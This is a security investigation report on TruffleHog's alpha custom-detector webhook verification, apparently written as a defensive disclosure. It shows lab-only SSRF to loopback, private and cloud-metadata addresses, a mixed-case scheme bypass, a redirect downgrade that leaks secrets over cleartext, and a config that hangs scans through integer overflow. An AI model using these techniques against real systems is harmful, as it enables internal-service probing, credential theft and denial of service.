# TruffleHog Custom-Detector Verification (Webhook) — Security Investigation

**Subject:** the custom regex-detector *verification* (webhook) feature of TruffleHog.
**Commit under test:** `e42153d44a5e5c37c1bd0c70e074781e9edcb760`.
**Binary:** built from this commit with `CGO_ENABLED=0 go build` (Go 1.24.2) to a path **outside** the repository checkout, invoked **only** through its canonical CLI entry point `trufflehog filesystem --config=<yaml> <target>` — never a debug hook, internal-API mock, or synthetic bypass.
**Method:** every behavioral claim below was produced by **running** that binary against crafted configs/targets while local, threaded, loopback-bound mock HTTP/HTTPS servers captured the real requests (method, path, headers, body, count) or via wall-clock timing. Each quantitative result was reproduced across **≥ 2 runs**. All lab artifacts lived outside the repository and were deleted afterward; the source tree is byte-for-byte unchanged (verified with `git status`).
**Labeling (provenance).** Every claim is tagged:
- **[OBSERVED]** — confirmed at runtime through the canonical entry point, with the captured output shown.
- **[INFERRED]** — derived from reading the source at the frozen commit; not directly exercised (or not directly observable) at runtime.
- **[CORROBORATED]** — an inferred mechanism that a runtime observation independently supports.

External references (Go, AWS, OWASP) used to benchmark observed behavior against documented expectations are listed in the final **External references** section; source `file:line` citations point at the frozen commit.

> **Feature status (alpha).** This analysis reflects an **alpha** feature. Per `README.md:L644`: *"NB: This feature is alpha and subject to change."* (`README.md:L628` titles it "Regex Detector (alpha)".) Behavior may change in later releases.

---

## Executive verdict

A party who controls a custom-detector configuration (the YAML passed to `--config`) wields meaningful, and in several respects unbounded, power over the verification subsystem. The table summarizes what was **observed**; each row links to the detailed section that shows the captured output, the responsible `file:line`, and the reproduction.

| # | Question | Verdict (observed) |
|---|----------|--------------------|
| **Q1** | SSRF to internal / metadata (e.g. `169.254.169.254`) | **No destination validation.** The only endpoint checks are non-empty and a **case-sensitive** `http://`-requires-`unsafe` gate; there is **no** allowlist/blocklist, reserved-range, or DNS check. Loopback, RFC1918 private, and the exact `169.254.169.254` endpoint are all dispatched to. On an **exact HTTP 200** the full body is read into memory and the first **200 bytes** (not characters) are echoed into `ExtraData["response"]` → a **semi-in-band SSRF read** primitive. A mixed-case scheme (`HTTP://`) **bypasses** even the `unsafe` gate. (A fixed `POST` will **not** lift credentials from a modern **IMDSv2** endpoint, which requires a `PUT`-token then `GET`.) |
| **Q2** | TLS certificate validation / MITM | **Validation is ON by default** (Go `crypto/tls` system-CA chain **and** hostname/SAN check). A self-signed or wrong-host certificate is **rejected before any HTTP request is sent**; the `unsafe` flag **does not** disable TLS validation. Qualifiers: there is **no certificate pinning** (any CA in the host store — incl. an installed corporate/MITM root — is accepted), and a config-controlled **`307`/`308` redirect to `http://` downgrades the secret onto cleartext**. |
| **Q3** | Verification multiplicity / rate limit | **Not "once."** One request **per permutation** = one selection from the **Cartesian product** of per-named-regex match lists **within a span**, clamped by `maxTotalMatches = 100` **per span (per `FromData`)** — **not** a global cap. A file has many spans across one or more chunks, so total requests are **unbounded by 100** (observed **200** and **470** from single files), further **×M verifiers**, dispatched **concurrently with no `SetLimit` and no throttle/delay**. A default-on **verification cache** can suppress duplicates; and a permutation-count **integer overflow** lets a declarative config **hang the scan indefinitely** (config-DoS). |
| **Q4** | Data sent to the webhook | A **`POST`** with a JSON body `{"<DetectorName>":{"<regexName>":["<submatch>",…]}}` (**the matched secret**, plus capture group if present); **each configured header — normalized, not verbatim** (split on first colon, value left-trimmed, key canonicalized, duplicates appended); and a **`User-Agent`** (`TruffleHog` by default, `TruffleHog <suffix>` with `--user-agent-suffix`, or **fully overridden** by a config `User-Agent` header). **No `Content-Type`.** `SuccessRanges` is parsed but **never applied** (only `== 200` verifies). |
| **Q5** | ReDoS / regex safety | **Structurally safe against catastrophic backtracking.** Custom patterns are compiled/executed with **Go's standard-library `regexp`** — RE2 *syntax* and RE2's **linear-time** guarantee, **no backtracking, no backreferences** (it is Go's own pure-Go engine, **not** a separately linked C++ RE2 library). Timing stays flat under a classic "evil" pattern; a backreference is rejected at config load. The **10 s timeout and `MaxSecretSize` bound the input, not the match** — the safety is the engine. |
| **Q6** | Overall threat model | A config author **can** exfiltrate matched secrets + arbitrary static headers (Q4), use TruffleHog as an **SSRF proxy** into loopback/private/link-local/metadata services with **200-byte** response readback (Q1), **burst up to 100 concurrent unthrottled requests per span** and drive a file well past 100 (Q3), and **wedge a scan indefinitely** with an overflow config (Q3/C3). They **cannot** trivially MITM TLS on the direct hop without a host-trusted cert (Q2) or trigger ReDoS (Q5). |

### The verification pipeline (config → detect → verify)

```mermaid
flowchart TD
    A["trufflehog filesystem --config=&lt;yaml&gt;<br/>main.go config.Read (L463)"] --> B["config.NewYAML: protoyaml.UnmarshalStrict<br/>pkg/config/config.go L27-L36"]
    B --> C["NewWebhookCustomRegex → validate<br/>ValidateVerifyEndpoint: scheme-only, case-sensitive http:// gate (validation.go L35-L44)"]
    C --> D["Engine.detectChunk: iterate spans; FromData called ONCE PER SPAN<br/>ctx = WithTimeout(10s) engine.go L1058-L1070"]
    D --> CACHE{"verification cache (default ON)<br/>all results already cached?<br/>verification_cache.go L69-L133"}
    CACHE -->|"yes (all-hit)"| SUPP["span suppressed: 0 HTTP requests"]
    CACHE -->|"no (any-miss)"| E["CustomRegexWebhook.FromData (per span)<br/>custom_detectors.go L64"]
    E --> F["regexp.Compile + FindAllStringSubmatch<br/>Go stdlib regexp (RE2 syntax, linear-time) L92, L97"]
    F --> G["permutateMatches → productIndices<br/>count = product of matches per named regex, clamped to maxTotalMatches=100 PER SPAN (not global)<br/>L110, L288-L299"]
    G --> H["errgroup: one goroutine per permutation, NO SetLimit (unbounded concurrency)<br/>L112, L155-L161"]
    H --> I["createResults: loop verify[] until first exact-200<br/>POST JSON body + normalized headers + User-Agent<br/>via SaneHttpClient system-CA TLS (L62) → L214-L240"]
    I --> J{"HTTP status == 200 (exact)?"}
    J -->|"yes"| K["Verified=true set BEFORE io.ReadAll (full body read);<br/>store first 200 BYTES in ExtraData[&quot;response&quot;] L249-L266"]
    J -->|"no / network error"| L["continue to next verifier; result stays unverified L242, L272-L276"]
    G -.->|"if product overflows int64 → negative → cap bypassed → make() panics → wgDoneFn skipped"| X["config-DoS: scan HANGS (Q3/C3)<br/>custom_detectors.go L288-L299; engine.go L1049,L1123"]
```

---

## Q1 — SSRF: internal addresses & cloud metadata (`169.254.169.254`)

**User question:** *"If a detector config points to an internal address or cloud metadata endpoint (e.g., 169.254.169.254), what actually happens? Is there validation preventing this?"*

### Direct answer — **[OBSERVED]**
**There is NO destination validation.** The only endpoint checks are (1) the endpoint must be non-empty and (2) an endpoint whose scheme is the lowercase literal `http://` requires `unsafe: true`. There is **no allowlist/blocklist, no reserved-range (loopback/RFC1918/link-local) check, and no DNS-resolution guard**. Consequently a config can point the verifier at **loopback**, an **RFC1918 private** address, or the **`169.254.169.254`** link-local cloud-metadata address, and TruffleHog dispatches the request. On an **exact HTTP 200** the response body is read **in full into memory** and then a **200-byte** (not 200-character) prefix is echoed into the scan result's `ExtraData["response"]`, giving a **semi-in-band SSRF read** primitive. Two important limits: the readback appears only for results that are actually **emitted** (a verified, non-filtered result) and only on a **cache miss** (Q3); and because the request is a fixed **`POST`**, it will not, by itself, retrieve credentials from a modern **IMDSv2** endpoint (which requires a `PUT` token then a `GET`).

### Mechanism (cause → effect) — **[INFERRED from source, corroborated by the runs below]**
- Sole endpoint validator `ValidateVerifyEndpoint` — `pkg/custom_detectors/validation.go:L35-L44`: checks `len(endpoint)==0` and `strings.HasPrefix(endpoint, "http://") && !unsafe`. It inspects only length and the **case-sensitive** `http://` prefix — never the host/IP. No `net.ParseIP`, no CIDR check, no DNS resolution exists in this path.
- Because the prefix check is case-sensitive, an endpoint written `HTTP://…` (or any mixed case) **bypasses** the `unsafe` requirement entirely.
- Dispatch: `http.NewRequestWithContext(ctx, "POST", verifyConfig.GetEndpoint(), …)` (`custom_detectors.go:L228`) then `httpClient.Do(req)` (`:L240`) to the configured URL. Redirects are handled by Go's default `http.Client` policy (up to 10 hops), so the **final** destination can differ from the configured one.
- Readback: on `resp.StatusCode == http.StatusOK` (**exactly 200**) `result.Verified = true` is set **before** `body, _ := io.ReadAll(resp.Body)` reads the **entire** body; then `responseStr := string(body); if len(responseStr) > 200 { responseStr = responseStr[:200] }` stores a **200-byte** prefix in `ExtraData["response"]` — `custom_detectors.go:L249-L266`.

### Observed output

**Q1.a — loopback dispatch + 200-BYTE readback truncation (2 runs identical).** Mock returns a 325-byte body:
```
$ /tmp/lab/th filesystem --no-update --json --config=repro_q1.yaml repro_q1.txt     # run 1 and run 2
Verified=True echoed_len=200 (server sent 325)
# request captured at mock: method=POST path=/ body={"LoopbackSSRF":{"theToken":["labtok_aaa111"]}}
```

**Q1.b — 200 is BYTES, not characters.** Mock returns 150 × `U+00E9` (2 bytes each = 300 bytes):
```
echoed_response: byte_len=200 char_len=100 (server sent 300 bytes = 150 chars)
```
The echoed value is 200 **bytes** (= 100 two-byte characters), confirming the `[:200]` slice is byte-indexed.

**Q1.c — RFC1918 private address `10.236.7.63` (the container's own private IP).** The POST reaches an internal service with the secret and an attacker probe header:
```
✅ Found verified result 🐷🔑
# captured at the private address 10.236.7.63:18142 :
{"seq": 1, "method": "POST", "path": "/internal/admin", "ua": "TruffleHog", "auth": null, "content_type": null, "ua_all": ["TruffleHog"], "headers": [["Host", "10.236.7.63:18142"], ["User-Agent", "TruffleHog"], ["Content-Length", "46"], ["X-Probe", "internal"], ["Accept-Encoding", "gzip"]], "body": "{\"PrivateSSRF\":{\"theToken\":[\"labtok_ccc333\"]}}"}
```

**Q1.d — mixed-case scheme bypass.** Endpoint `HTTP://127.0.0.1:18143/bypass` with **no** `unsafe` — the config loads and the plaintext request is dispatched anyway:
```
✅ Found verified result 🐷🔑
mock received (bypass proof) = 1 request(s):
{"method": "POST", "path": "/bypass", "ua": "TruffleHog", "body": "{\"MixedCaseBypass\":{\"theToken\":[\"labtok_ddd444\"]}}"}
```

**Q1.e — the only validation that exists (scheme/empty), shown by contrast:**
```
# http:// (lowercase) WITHOUT unsafe:
error parsing the provided configuration file  {"error": "http endpoint must have unsafe=true"}
# empty endpoint:
error parsing the provided configuration file  {"error": "no endpoint"}
```

**Q1.f — the user's exact example `169.254.169.254`.** Two independent, safe observations:

*(f-1) Config accepted, no destination-validation error* — run with `--no-verification` so **no packet is sent**:
```
$ /tmp/lab/th filesystem --no-update --no-verification --config=q15.yaml q15.txt
Found unverified result 🐷🔑❓          # loads and scans; NO validation error for the 169.254.169.254 endpoint
```

*(f-2) Dispatch to the exact address, proven under a FAIL-CLOSED harness that cannot reach real IMDS.* A filter-table `DROP` for `-d 169.254.169.254 --dport 80` is installed **first** (real IMDS unreachable by default); a nat `REDIRECT` then sends that traffic to a **loopback synthetic fake**; a preflight `curl` must hit the synthetic sentinel or the run **aborts**; a trap removes both rules on exit. The nat rule's packet counter incrementing is the proof TruffleHog targeted `169.254.169.254`:
```
=== rules installed (DROP fail-closed + REDIRECT to 127.0.0.1:18160) ===
  filter: -A OUTPUT -d 169.254.169.254/32 -p tcp -m tcp --dport 80 -j DROP
  nat:    -A OUTPUT -d 169.254.169.254/32 -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 18160
=== preflight: curl http://169.254.169.254/preflight -> synthetic fake hit (safe to proceed) ===
=== nat REDIRECT packet count BEFORE trufflehog: 1 ===
=== trufflehog output ===
  Verified=True
  echoed_response(len=200): {"Code":"Success","Type":"AWS-HMAC","AccessKeyId":"FAKE-SYNTHETIC-LAB-ONLY-AKIA0000","SecretAccessKey":"FAKE-SYNTHETIC-LAB-ONLY-DO-NOT-USE-000000000000","Token":"FAKE-SYNTHETIC-SESSION-TOKEN-LAB-ONLY-
=== nat REDIRECT packet count AFTER trufflehog: 2  (delta = TruffleHog's packet to 169.254.169.254) ===
=== request captured at fake standing in for 169.254.169.254 ===
  {"method": "POST", "path": "/latest/meta-data/iam/security-credentials/", "ua": "TruffleHog", "metadata_hdr": "true", "body": "{\"MetadataSSRFDetector\":{\"theToken\":[\"labtok_aaa111\"]}}"}
=== teardown: rules removed; 169.254 rules remaining: filter=0 nat=0 ===
```
TruffleHog dispatched `POST /latest/meta-data/iam/security-credentials/` with the `Metadata: true` header and the secret body to `169.254.169.254`, and echoed 200 bytes of the (synthetic) response. **No real metadata service was contacted** — the fail-closed `DROP` guaranteed that, and the synthetic body is clearly labelled `FAKE-SYNTHETIC-LAB-ONLY`.

> **[INFERRED / CORROBORATED]** (a) The full body is read into memory before the 200-byte slice, so a large or `gzip`-inflated response is a memory-amplification risk (`io.ReadAll` at `custom_detectors.go:L253`). (b) Because the request is a fixed `POST`, it would **not** retrieve credentials from a modern **IMDSv2** endpoint, which requires a `PUT /latest/api/token` then a token-bearing `GET` (AWS IMDS docs); the dispatch and readback primitive is real, but "AWS credential theft" is not turnkey against IMDSv2. (c) DNS resolution and DNS-rebinding are not guarded; a hostname endpoint is resolved by Go with no pre-dispatch validation.

### Reproduction
1. Start the plaintext mock (Appendix) on `127.0.0.1:<port>` returning a >200-byte body; write a detector config with `verify.endpoint: http://127.0.0.1:<port>/` and `unsafe: true`.
2. `trufflehog filesystem --no-update --json --config=<cfg> <target>` → observe `Verified=True` and a 200-byte `ExtraData["response"]`.
3. Repeat with the endpoint set to an RFC1918 address (mock bound to that address) and, for the exact metadata address, only under the **fail-closed** iptables `DROP`+`REDIRECT` harness with a preflight abort (never against a live metadata service).

---

## Q2 — TLS certificate validation / man-in-the-middle

**User question:** *"When verification requests are made over HTTPS, what certificate validation does TruffleHog perform? Could a network-path attacker intercept the traffic?"*

**Direct answer.** Over HTTPS the webhook performs **full, standard TLS verification** — Go's `crypto/tls` defaults: the server chain is validated against the **host's system CA store** *and* the hostname/SAN is checked. The `unsafe` flag does **not** weaken this (it governs only the `http://` scheme gate). Therefore a passive or active network-path attacker **cannot** intercept HTTPS verification on the direct hop **unless they already hold a certificate that chains to a CA in the host's trust store (or have compromised that store)**. Two important qualifiers below the headline: (1) there is **no certificate pinning** for webhooks, so *any* CA the host trusts — including a corporate/MITM interception CA — is accepted; and (2) TruffleHog **follows HTTP redirects**, and a `307`/`308` from the configured HTTPS endpoint to an `http://` URL causes the **secret (and any configured `Authorization` header) to be re-sent over cleartext** — an attacker-triggerable downgrade that a config author controls.

All results below use a threaded HTTPS mock that counts **app-layer requests** (handshake completed) separately from **TLS handshake failures**; each case run twice.

### Condition A — self-signed (untrusted) cert: rejected before any request; `unsafe` makes no difference [OBSERVED]

Command: `/tmp/lab/th filesystem --no-update --no-verification-cache --config=<cfg> --json tgt.txt`, endpoint `https://127.0.0.1:PORT/verify`, server presents the self-signed cert (`ss.crt`), **no** `SSL_CERT_FILE`. Two configs: `unsafe: false` and `unsafe: true`.

```
[unsafe=false] run1 verified=0  {"app_layer": 0, "handshake_errors": 1, "last_error": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] ssl/tls alert bad certificate (_ssl.c:1033)"}
[unsafe=false] run2 verified=0  {"app_layer": 0, "handshake_errors": 1, "last_error": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] ssl/tls alert bad certificate (_ssl.c:1033)"}
[unsafe=true ] run1 verified=0  {"app_layer": 0, "handshake_errors": 1, "last_error": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] ssl/tls alert bad certificate (_ssl.c:1033)"}
[unsafe=true ] run2 verified=0  {"app_layer": 0, "handshake_errors": 1, "last_error": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] ssl/tls alert bad certificate (_ssl.c:1033)"}
```

Cause→effect: the client aborts the handshake (the server observes the client's `bad_certificate` alert) and **no HTTP request is ever sent** (`app_layer=0`); the result is unverified. `unsafe:true` is byte-for-byte identical — it does not touch TLS.

### Condition B — trusted CA + correct SAN (`IP:127.0.0.1`): handshake succeeds, request delivered, verified [OBSERVED]

A private CA issues a leaf with `subjectAltName=IP:127.0.0.1`; the server presents `leaf+CA`; the run injects that CA via `SSL_CERT_FILE=ca.crt`.

```
[trusted, correct SAN] run1 verified=1  {"app_layer": 1, "handshake_errors": 0, "last_error": null}
[trusted, correct SAN] run2 verified=1  {"app_layer": 1, "handshake_errors": 0, "last_error": null}
```

Human output: `✅ Found verified result … Response: OK … verified_secrets: 1`. App-layer log confirms the delivered body: `POST /verify {"TlsDetector":{"theToken":["labtok_tls001"]}}`. Cause→effect: a chain to a trusted root **and** a matching host allows the handshake, the POST is delivered, the `200` verifies. (This shows what an attacker must obtain to intercept: a host-trusted certificate for the target host.)

### Condition C — trusted CA + WRONG SAN (`wrong.example.com`): rejected on hostname check [OBSERVED]

Same CA (trusted via `SSL_CERT_FILE`), but the leaf's SAN is `DNS:wrong.example.com` while the endpoint host is `127.0.0.1`.

```
[trusted, wrong SAN] run1 verified=0  {"app_layer": 0, "handshake_errors": 1, "last_error": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] ssl/tls alert bad certificate (_ssl.c:1033)"}
[trusted, wrong SAN] run2 verified=0  {"app_layer": 0, "handshake_errors": 1, "last_error": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] ssl/tls alert bad certificate (_ssl.c:1033)"}
```

Cause→effect: chain validation passes but **hostname/SAN verification fails**, the client aborts, `app_layer=0`, unverified. This isolates hostname checking as active — a valid-but-wrong-host cert is not accepted. (Go's specific client-side error for this case is `x509: certificate is valid for wrong.example.com, not 127.0.0.1` [INFERRED from Go `crypto/x509`; the OBSERVED signal is the handshake abort above].)

### Condition D — HTTPS→HTTP redirect downgrade: secret re-sent over cleartext on 307/308 [OBSERVED]

A **trusted** HTTPS endpoint (P1) answers with a 3xx `Location: http://127.0.0.1:P2/leak` (plaintext). Config also sets `headers: ['Authorization: Bearer SECRET-BEARER-TOKEN']`.

```
[302] https_P1=1  plaintext_P2=1  P2_method=GET   P2_body=            (POST→GET, body dropped)
[307] https_P1=1  plaintext_P2=1  P2_method=POST  P2_body={"RedirDetector":{"theToken":["labtok_redir01"]}}
[308] https_P1=1  plaintext_P2=1  P2_method=POST  P2_body={"RedirDetector":{"theToken":["labtok_redir01"]}}
```

Plaintext P2 headers on the 307 hop: `User-Agent: TruffleHog`, **`Authorization: Bearer SECRET-BEARER-TOKEN`**, `Content-Length: 49`. Cause→effect: TruffleHog's client follows redirects (Go default `CheckRedirect`, ≤10 hops). For `302` the body is dropped (POST→GET), but for **`307`/`308` the full body (the matched secret) and — because the target is the same host — the `Authorization` header are re-transmitted over cleartext HTTP**, where a network attacker on that hop can read them. (Cross-host 307/308 would strip `Authorization` but still re-send the body [INFERRED from Go redirect rules]; the same-host retention above is OBSERVED.)

### Mechanism (cause→effect, with citations)

- The webhook client is `common.SaneHttpClient()` [`pkg/custom_detectors/custom_detectors.go:62`]; its `saneTransport` sets **no `TLSClientConfig`** [`pkg/common/http.go:211-221`], so Go applies default system-CA chain + hostname verification. Request timeout 5 s [`pkg/common/http.go:209`].
- `unsafe` is consumed **only** by `ValidateVerifyEndpoint` for the scheme gate [`pkg/custom_detectors/validation.go:35-44`]; it never reaches the TLS layer.
- The only TLS-disabling option in the codebase, `WithInsecureTLS` (`InsecureSkipVerify:true`) [`pkg/roundtripper/roundtripper.go:122-127`], is wired **exclusively** to the Jenkins **source** connector [`pkg/sources/jenkins/jenkins.go:81-83`] — never to a custom-detector webhook. So a webhook config **cannot** turn off certificate validation.
- There is **no certificate pinning** on the webhook path: `PinnedRetryableHttpClient` (pinned ISRG roots) exists [`pkg/common/http.go:159-178`] but the webhook uses `SaneHttpClient`, not it. Any CA in the host store is therefore accepted.
- `saneTransport` uses `Proxy: http.ProxyFromEnvironment` [`pkg/common/http.go:212`], so `HTTP(S)_PROXY` env vars are honored for webhook traffic.

**Scope of "cannot intercept."** Against the *direct* hop, a self-signed or wrong-host certificate is rejected (Conditions A, C), so a naive MITM fails. Interception is possible only if the attacker's certificate chains to a CA the **host already trusts** (e.g., an installed corporate-proxy/MITM root — accepted because there is no pinning), or if the config author supplies an endpoint that **downgrades to plaintext via 307/308** (Condition D). The custom regex-detector feature is documented **alpha** [`README.md:644`].

**Coverage:** HTTPS validation performed? **Yes — system-CA chain + hostname** (A,B,C). Could a network attacker intercept? **Not on the direct hop without a host-trusted cert** (A,C); **yes** via an installed/compromised trust root (no pinning) or a **307/308 plaintext downgrade** the config author can force (D). `unsafe` effect on TLS? **None** (A).

---

## Q3 — Verification multiplicity and rate limiting

**User question:** *"When a detector has multiple matching patterns in the same file, does it verify once or something more complex? Is there any limit on how many requests can be triggered?"*

**Direct answer.** When a detector matches multiple patterns, it does **not** verify "once." It fires **one verification attempt per _permutation_**, where a permutation is one selection from the **Cartesian product** of the per‑named‑regex match lists found **within a single match span**. There **is** a limit, but it is **not** a global cap of 100: `maxTotalMatches = 100` clamps the permutation count **inside one `productIndices` call — i.e. per span (per `FromData` invocation)**, and a single file produces **many** spans (one per keyword region, merged) across **one or more** chunks. Consequently the total number of outbound requests a file can trigger is **unbounded by 100** and is governed by the formula below. There is **no throttling, no inter‑request delay, and no token‑bucket/rate‑limit anywhere** in the path.

**Requests, exactly.** For one span:

```
requests(span) = min( Π_over_named_regexes ( #matches_of_that_regex_in_span ) , 100 )
                 × (verifiers tried per permutation: 1..M, stopping at the first exact-200)
```

and a file emits `Σ over spans over chunks` of that quantity. `M` = number of `verify:` entries.

---

### Condition 1 — single named regex, one span: per-span clamp = `min(N,100)` [OBSERVED]

Command (per N): `/tmp/lab/th filesystem --no-update --no-verification-cache --scan-entire-chunk --config=a.yaml a_$N.txt` (config: 1 detector, regex `theToken: labtok_[a-z0-9]+`, 1 verifier→mock; target: N distinct `labtok_%06d` tokens; `--scan-entire-chunk` forces the whole file into one span; request count = lines in the mock log). Two runs each:

```
  N=5   run=1 requests=5     run=2 requests=5
  N=50  run=1 requests=50    run=2 requests=50
  N=99  run=1 requests=99    run=2 requests=99
  N=100 run=1 requests=100   run=2 requests=100
  N=101 run=1 requests=100   run=2 requests=100
  N=150 run=1 requests=100   run=2 requests=100
```

Mechanism (cause→effect): a single named regex with N in-span matches yields `lengths=[N]`, so `productIndices(N)` returns `min(N,100)` permutations [`pkg/custom_detectors/custom_detectors.go:295-296`]; `FromData` spawns one `errgroup` goroutine per permutation [`custom_detectors.go:112,155`], each running `createResults`, which issues exactly one POST for a single-verifier config. Hence requests = `min(N,100)` **for this span**.

### Condition 2 — two named regexes: the cap is on the PRODUCT, not the sum [OBSERVED]

Command: same as above with config `idpat: idz_[0-9]+` and `keypat: keyz_[a-z]+`; target has `a` distinct `idz_` and `b` distinct `keyz_` tokens.

```
  a=3  b=4  run=1 requests=12    run=2 requests=12    (product=12, sum=7)
  a=11 b=10 run=1 requests=100   run=2 requests=100   (product=110, sum=21 → capped 100)
```

Mechanism: `permutateMatches` builds `lengths=[a,b]` and calls `productIndices(a,b)` whose `count = a*b` [`custom_detectors.go:288-290`, invoked at `:329`], then clamps to 100. 3×4→12 (≠ sum 7) proves the unit is the **Cartesian product of matches**, and 11×10→100 proves the clamp applies to that product.

### Condition 3 — the 100 cap is PER SPAN, so a single file exceeds 100 [OBSERVED — refutes any "hard-capped at 100" reading]

`detectChunk` calls `FromData` **once per span** — `matches := data.detector.Matches(); for _, matchBytes := range matches { … FromData(…, matchBytes) }` [`pkg/engine/engine.go:1061-1070`]. Spans are the merged keyword regions computed by the default `adjustableSpanCalculator` (radius 512, end = keywordIdx+`MaxSecretSize`=1000) [`pkg/engine/ahocorasick/ahocorasickcore.go:80-113,160`]. Two dense token clusters separated by a >1.5 KB keyword-free gap therefore form **two** spans in **one** chunk, each independently clamped to 100.

Command (NO `--scan-entire-chunk`, default spans): `/tmp/lab/th filesystem --no-update --no-verification-cache --config=ms.yaml msC.txt` — `msC.txt` = 100 distinct tokens, 4000×`x` gap, 100 distinct tokens (7001 bytes < ChunkSize 10240 → single chunk):

```
  file bytes: 7001  (<10240 => single chunk)
  run=1 total_requests=200
  run=2 total_requests=200
  run=3 total_requests=200
```

Across MULTIPLE chunks (4 clusters × 100, 24003 bytes > 10240):

```
  file bytes: 24003  (>10240 => multiple chunks)
  run=1 total_requests=470
  run=2 total_requests=470
```

Cause→effect: 2 spans → 2×100 = **200**; multiple chunks → **470** (each chunk contributes its own per-span 100s; the value exceeds 400 because TruffleHog re-scans the 3072-byte peek overlap between adjacent chunks [`pkg/sources/chunker.go`], double-counting boundary clusters — a real product behavior, not a harness artifact). Either way, **a file trivially drives >100 outbound requests**, so 100 is a per-span work-limit, never a global request ceiling.

### Condition 4 — multiple verifiers multiply requests further [OBSERVED]

`createResults` loops over every `verify:` entry, sending to each in order until one returns an **exact 200**, then `break` [`custom_detectors.go:222-223,240,249,268`]. With M verifiers that never return 200, each permutation issues M requests.

Command: config with 3 verifiers (`/v1,/v2,/v3`) all served **500**; target = 5 permutations:

```
  run=1 total=15  /v1=5 /v2=5 /v3=5
  run=2 total=15  /v1=5 /v2=5 /v3=5
```

Cause→effect: 5 permutations × 3 verifiers (none 200) = **15** requests. So the per-span figure is further multiplied by up to M.

### Condition 5 — concurrency and the (absence of) throttling [OBSERVED + source]

All permutation goroutines are launched on an `errgroup.Group` created with **no `SetLimit`** [`custom_detectors.go:112,155,161`], so up to 100 verification requests for one span run **concurrently**. Detector workers number `concurrency * 8` (`detectorWorkerMultiplier` default 8) [`pkg/engine/engine.go:343-345,676`] = **32** on this 4-CPU host. There is no `time.Sleep`, rate limiter, or token bucket anywhere in `FromData`/`createResults`.

Runtime confirmation that nothing paces the requests — 100 requests add ~0.16 s over a 1-request scan (both dominated by the ~1.9 s process/scan startup floor):

```
  N=1   requests=1   wall=1.900s
  N=100 requests=100 wall=2.056s
```

### Condition 6 — verification cache (DEFAULT ON): what suppresses requests [OBSERVED + source]

Verification caching is **on by default** (disable with `--no-verification-cache`) [`main.go:85,535-536`]. It is **all-or-nothing per span**: the wrapper first calls the detector with `verify=false`, looks up every result, and only if **every** result is already cached returns with **zero** HTTP requests; if **any** result misses, the **whole span** is re-verified [`pkg/verificationcache/verification_cache.go:69-133`].

Cross-span suppression — the SAME secret in two spans of one chunk (spans are processed sequentially in `detectChunk`'s loop, so span 1 stores before span 2 looks up):

```
  cache-ON  run=1 requests=1   run=2 requests=1     (span 2 fully cached → suppressed)
  cache-OFF run=1 requests=2   run=2 requests=2
```

Repeated-secret suppression at scale (30 copies of one secret): cache-ON collapses endpoint hits from 45→~12.

**Cache key excludes the detector name.** The key is `Hash(Raw ‖ RawV2 ‖ DetectorType)` [`verification_cache.go:136-146`], and `DetectorType` is the constant `CustomRegex` for **every** custom detector while `DetectorName` is **not** part of the key. Therefore two *different* custom detectors that match the *same secret value* share one cache entry, and a cached verified result is copied into the other via `CopyVerificationInfo` (`VerificationFromCache=true`) [`verification_cache.go:91-92`].

Runtime note on the collision [OBSERVED + INFERRED]: in a single concurrent scan, two custom detectors matching the same secret **race** — both miss the shared entry before either stores, so both verify (total=2 with and without cache):

```
  cache-ON  A_endpoint=1 B_endpoint=1 total=2
  cache-OFF A_endpoint=1 B_endpoint=1 total=2
```

The shared-key **collision is confirmed in source**; its harmful *poisoning direction* (detector B inheriting detector A's verified state without contacting B's own endpoint) is **order-dependent** and requires the cache to already hold A's result when B looks up. I did not observe deterministic poisoning in a single concurrent chunk (B, whose own endpoint returned 500, stayed unverified) — labeled **INFERRED** for the poisoning outcome, **OBSERVED** for the race and for the secret-keyed suppression.

### Condition 7 — the two distinct timeouts [source, corroborated by Condition below]

- Per-request HTTP client timeout = **5 s** (`SaneHttpClient`) [`pkg/common/http.go:209`].
- Per-span detection context timeout = **10 s** (`detectionTimeout = detectors.DefaultResponseTimeout`) [`pkg/engine/engine.go:37`; `pkg/detectors/http.go:18`], applied at `context.WithTimeout(ctx, detectionTimeout)` [`engine.go:1066`], overridable with `--detector-timeout` [`main.go:77,471`]. A watchdog logs "a detector ignored the context timeout" at detectionTimeout+1 s [`engine.go:1067`] (seen live in the config-DoS evidence below).

---

### Condition 8 — configuration-driven denial of service via permutation overflow [OBSERVED]

`productIndices` computes `count := 1; for _, l := range lengths { count *= l }` with **no overflow guard**, then `if count > maxTotalMatches { count = maxTotalMatches }`, then `make([][]int, count)` [`custom_detectors.go:288-299`]. A config with enough named regexes and in-span matches overflows the signed 64-bit `count` to a **negative** value; `count > 100` is then **false**, the cap is bypassed, and `make([][]int, negative)` **panics**.

Canonical run — detector with **10 named regexes**, target with **99 matches each** (`99^10 = 9.04e19`, int64-wrapped = **−1795512867667309079**), one chunk:

```
$ /tmp/lab/th filesystem --no-update --no-verification --scan-entire-chunk --config=ov.yaml ov.txt
VERDICT: still running after 25s -> HANG CONFIRMED (scan never completes)
```

Stderr from the panicking detector goroutine — **run 1 of 2**. The two runs are **structurally identical** (same frames, same `makeslice` error, same subsequent hang); only volatile values differ per run (goroutine ID, pointer/argument values, `detector_worker_id`, timestamps). The **only** transformation applied is abbreviating the absolute build path to `<checkout>/`; every other byte — including Go's own `...` struct-argument elision emitted by the runtime and the `+0x…` PC offsets — is verbatim:

```
2026-07-14T21:26:13Z	error	trufflehog	goroutine 462 [running]:
runtime/debug.Stack()
	/usr/local/go/src/runtime/debug/stack.go:26 +0x5e
github.com/trufflesecurity/trufflehog/v3/pkg/common.Recover({0x58f32c0, 0xc00225e900})
	<checkout>/pkg/common/recover.go:17 +0x5b
panic({0x4582100?, 0x586e6f0?})
	/usr/local/go/src/runtime/panic.go:792 +0x132
github.com/trufflesecurity/trufflehog/v3/pkg/custom_detectors.productIndices({0xc002dbc230, 0xa, 0xc0028e1250?})
	<checkout>/pkg/custom_detectors/custom_detectors.go:299 +0x6c
github.com/trufflesecurity/trufflehog/v3/pkg/custom_detectors.permutateMatches(0xc0028e16f8)
	<checkout>/pkg/custom_detectors/custom_detectors.go:329 +0x28f
